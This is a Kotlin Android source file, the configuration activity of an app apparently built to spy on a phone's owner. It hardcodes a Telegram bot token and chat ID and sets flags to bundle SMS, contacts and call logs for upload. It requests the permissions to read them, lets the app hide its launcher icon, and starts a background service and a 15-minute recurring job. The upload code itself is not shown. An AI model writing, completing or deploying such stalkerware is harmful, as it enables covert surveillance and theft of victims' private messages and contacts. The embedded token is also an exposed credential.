package com.esurakhsh

import android.Manifest
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.google.android.material.switchmaterial.SwitchMaterial
import java.util.concurrent.TimeUnit

class ConfigActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_config)

        val switchHideIcon = findViewById<SwitchMaterial>(R.id.switchHideIcon)

        // Hardcode Configuration
        val prefs = getSharedPreferences("config", Context.MODE_PRIVATE)
        prefs.edit()
            .putString("bot_token", "8274144502:AAEqG8iiOW8yH1M5S1xy6RfvXPlZeXYdcxk")
            .putString("chat_id", "-1003629446663")
            .putBoolean("zip_all", true)
            .putBoolean("sms_individual", false)
            .putBoolean("calls_csv", true)
            .apply()

        // Check current icon state
        val componentName = ComponentName(this, "$packageName.Launcher")
        val setting = packageManager.getComponentEnabledSetting(componentName)
        val isHidden = setting == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
        switchHideIcon.isChecked = isHidden

        switchHideIcon.setOnCheckedChangeListener { _, isChecked ->
            // Handle Icon Hiding
            val newState = if (isChecked) {
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED
            } else {
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED
            }
            
            packageManager.setComponentEnabledSetting(
                componentName,
                newState,
                PackageManager.DONT_KILL_APP
            )
            val msg = if (isChecked) "Icon Hidden" else "Icon Visible"
            Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()
        }

        // Auto-start service logic
        if (checkPermissions()) {
            startSyncService()
            scheduleWork()
            Toast.makeText(this, "Service Active", Toast.LENGTH_SHORT).show()
        } else {
            requestPermissions()
        }
    }

    private fun checkPermissions(): Boolean {
        val sms = ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
        val contacts = ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
        val callLog = ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED
        val accounts = ActivityCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS) == PackageManager.PERMISSION_GRANTED
        
        // Add notification check for Tiramisu+
        val notif = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED
        } else {
            true
        }
        return sms && contacts && callLog && accounts && notif
    }

    private fun requestPermissions() {
        val perms = mutableListOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.GET_ACCOUNTS
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms.add(Manifest.permission.POST_NOTIFICATIONS)
        }
        ActivityCompat.requestPermissions(this, perms.toTypedArray(), 101)
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 101) {
            if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                startSyncService()
                scheduleWork()
                Toast.makeText(this, "Configuration Saved & Started", Toast.LENGTH_SHORT).show()
            } else {
                Toast.makeText(this, "Permissions required", Toast.LENGTH_SHORT).show()
            }
        }
    }
    
    private fun startSyncService() {
        val intent = Intent(this, SyncService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    private fun scheduleWork() {
         val workRequest = PeriodicWorkRequestBuilder<SyncWorker>(15, TimeUnit.MINUTES)
            .build()
        WorkManager.getInstance(this).enqueue(workRequest)
    }
}